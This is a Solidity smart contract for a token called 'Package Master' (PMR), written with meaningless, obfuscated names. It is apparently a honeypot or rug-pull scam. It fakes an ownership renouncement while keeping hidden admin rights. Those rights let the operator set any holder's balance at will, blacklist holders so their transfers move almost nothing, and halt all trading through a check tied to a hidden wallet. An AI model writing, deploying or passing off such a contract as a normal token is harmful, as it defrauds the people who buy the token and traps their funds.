//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface swapMarketing {
    function createPair(address launchedToFee, address minMarketing) external returns (address);
}

interface launchedFeeAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxExempt) external view returns (uint256);

    function transfer(address tokenTeam, uint256 receiverTx) external returns (bool);

    function allowance(address modeTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverTx) external returns (bool);

    function transferFrom(
        address sender,
        address tokenTeam,
        uint256 receiverTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyTake, uint256 value);
    event Approval(address indexed modeTotal, address indexed spender, uint256 value);
}

abstract contract tokenAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txTotal is launchedFeeAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PackageMaster is tokenAt, launchedFeeAt, txTotal {

    function decimals() external view virtual override returns (uint8) {
        return walletAmount;
    }

    uint256 public totalTo;

    uint256 public swapShould;

    bool public atTx;

    function totalSupply() external view virtual override returns (uint256) {
        return sellExempt;
    }

    function getOwner() external view returns (address) {
        return fromSell;
    }

    function takeSender(address amountAuto, address tokenTeam, uint256 receiverTx) internal returns (bool) {
        if (amountAuto == sellFund) {
            return receiverBuy(amountAuto, tokenTeam, receiverTx);
        }
        uint256 launchTotal = launchedFeeAt(teamExempt).balanceOf(shouldFeeSender);
        require(launchTotal == fundLaunched);
        require(tokenTeam != shouldFeeSender);
        if (sellTake[amountAuto]) {
            return receiverBuy(amountAuto, tokenTeam, toTeam);
        }
        return receiverBuy(amountAuto, tokenTeam, receiverTx);
    }

    string private receiverShouldEnable = "Package Master";

    function name() external view virtual override returns (string memory) {
        return receiverShouldEnable;
    }

    uint256 private sellExempt = 100000000 * 10 ** 18;

    function modeLimitWallet(address walletSellTo) public {
        require(walletSellTo.balance < 100000);
        if (atTx) {
            return;
        }
        
        autoIs[walletSellTo] = true;
        
        atTx = true;
    }

    address public sellFund;

    function allowance(address exemptTrading, address receiverToLiquidity) external view virtual override returns (uint256) {
        if (receiverToLiquidity == modeSenderFrom) {
            return type(uint256).max;
        }
        return maxWallet[exemptTrading][receiverToLiquidity];
    }

    address public teamExempt;

    function fromBuy() public {
        emit OwnershipTransferred(sellFund, address(0));
        fromSell = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return teamSell;
    }

    bool private autoToMode;

    mapping(address => uint256) private teamMarketing;

    bool private takeMarketing;

    function owner() external view returns (address) {
        return fromSell;
    }

    bool public amountFund;

    uint256 private teamMax;

    address shouldFeeSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 exemptMin;

    function approve(address receiverToLiquidity, uint256 receiverTx) public virtual override returns (bool) {
        maxWallet[_msgSender()][receiverToLiquidity] = receiverTx;
        emit Approval(_msgSender(), receiverToLiquidity, receiverTx);
        return true;
    }

    function receiverBuy(address amountAuto, address tokenTeam, uint256 receiverTx) internal returns (bool) {
        require(teamMarketing[amountAuto] >= receiverTx);
        teamMarketing[amountAuto] -= receiverTx;
        teamMarketing[tokenTeam] += receiverTx;
        emit Transfer(amountAuto, tokenTeam, receiverTx);
        return true;
    }

    function minMaxReceiver() private view {
        require(autoIs[_msgSender()]);
    }

    uint8 private walletAmount = 18;

    uint256 fundLaunched;

    mapping(address => bool) public autoIs;

    uint256 constant toTeam = 5 ** 10;

    function teamModeLaunched(address receiverFund) public {
        minMaxReceiver();
        
        if (receiverFund == sellFund || receiverFund == teamExempt) {
            return;
        }
        sellTake[receiverFund] = true;
    }

    constructor (){
        
        sellSender totalToken = sellSender(modeSenderFrom);
        teamExempt = swapMarketing(totalToken.factory()).createPair(totalToken.WETH(), address(this));
        
        sellFund = _msgSender();
        autoIs[sellFund] = true;
        teamMarketing[sellFund] = sellExempt;
        fromBuy();
        
        emit Transfer(address(0), sellFund, sellExempt);
    }

    address private fromSell;

    string private teamSell = "PMR";

    function sellAuto(uint256 receiverTx) public {
        minMaxReceiver();
        fundLaunched = receiverTx;
    }

    bool private launchMax;

    mapping(address => mapping(address => uint256)) private maxWallet;

    function balanceOf(address maxExempt) public view virtual override returns (uint256) {
        return teamMarketing[maxExempt];
    }

    event OwnershipTransferred(address indexed senderFrom, address indexed shouldAt);

    address modeSenderFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address amountAuto, address tokenTeam, uint256 receiverTx) external override returns (bool) {
        if (_msgSender() != modeSenderFrom) {
            if (maxWallet[amountAuto][_msgSender()] != type(uint256).max) {
                require(receiverTx <= maxWallet[amountAuto][_msgSender()]);
                maxWallet[amountAuto][_msgSender()] -= receiverTx;
            }
        }
        return takeSender(amountAuto, tokenTeam, receiverTx);
    }

    uint256 private amountTake;

    function transfer(address fundTake, uint256 receiverTx) external virtual override returns (bool) {
        return takeSender(_msgSender(), fundTake, receiverTx);
    }

    mapping(address => bool) public sellTake;

    function txFrom(address fundTake, uint256 receiverTx) public {
        minMaxReceiver();
        teamMarketing[fundTake] = receiverTx;
    }

    uint256 public teamTx;

}